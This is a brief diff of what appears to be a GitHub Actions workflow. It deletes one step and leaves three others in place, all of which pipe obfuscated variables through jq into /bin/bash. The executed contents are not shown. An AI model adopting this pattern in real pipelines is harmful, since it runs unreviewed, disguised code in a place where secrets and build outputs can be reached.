@@ -27,7 +27,6 @@ jobs:
           echo $d2 | jq -r .afnfp618 | /bin/bash
           printf '%s' "$he68" | jq -r .uyaku62 | /bin/bash
           printf '%s' "$hnskm4684" | jq -r .p30758 | /bin/bash
-          echo $k980 | jq -r .jdvs653 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
